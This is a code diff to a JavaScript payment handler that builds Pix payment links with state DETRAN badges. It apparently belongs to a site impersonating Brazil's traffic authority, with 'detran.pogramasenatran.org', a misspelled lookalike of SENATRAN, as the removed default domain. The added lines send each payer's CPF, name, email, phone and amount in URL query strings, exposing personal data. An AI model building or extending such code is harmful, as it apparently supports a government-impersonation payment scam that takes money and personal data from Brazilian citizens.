@@ -602,8 +602,22 @@ async function handlePaymentRequest(req, res) {
       .toUpperCase();
     const detranBadgeUrl = detranUf ? DETRAN_BADGE_BY_UF[detranUf] || "" : "";
     const cpfDigits = (customer.taxId || "").toString().replace(/\D/g, "");
-    const paymentLinkBase = process.env.PIX_PAYMENT_LINK_BASE || "https://detran.pogramasenatran.org";
-    const paymentLink = cpfDigits ? `${paymentLinkBase}/${cpfDigits}` : paymentLinkBase;
+    const requestHost = req.headers.host || "";
+    const defaultBase = requestHost ? `https://${requestHost}/pix-payment` : "https://popseal.vercel.app/pix-payment";
+    const paymentLinkBase = process.env.PIX_PAYMENT_LINK_BASE || defaultBase;
+    const baseWithCpf = paymentLinkBase.includes("{cpf}")
+      ? paymentLinkBase.replace("{cpf}", cpfDigits || "")
+      : paymentLinkBase;
+    const query = new URLSearchParams({
+      cpf: cpfDigits || "",
+      nome: customer.name || "",
+      email: customer.email || "",
+      phone: customer.cellphone || "",
+      amount: (amountCents / 100).toFixed(2),
+      title: FIXED_TITLE,
+      uf: detranUf || "",
+    });
+    const paymentLink = `${baseWithCpf}${baseWithCpf.includes("?") ? "&" : "?"}${query.toString()}`;
     const tracking = (() => {
       if (trackingFromBody && typeof trackingFromBody === "object" && !Array.isArray(trackingFromBody)) {
         const utm = typeof trackingFromBody.utm === "object" && trackingFromBody.utm ? trackingFromBody.utm : {};
